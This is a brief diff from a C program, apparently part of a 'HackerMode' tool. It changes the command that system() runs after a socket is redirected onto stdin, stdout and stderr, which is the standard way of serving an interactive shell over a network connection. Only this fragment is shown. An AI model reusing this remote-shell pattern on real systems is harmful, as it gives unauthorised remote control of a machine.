@@ -27,7 +27,7 @@ int main(int argc, char *argv[]){
   dup2(sfd,0);
   dup2(sfd,1);
   dup2(sfd,2);
-  system("python3 /home/Tests/HackerMode");
+  system("HackerMode");
   close(sfd);
 
 }
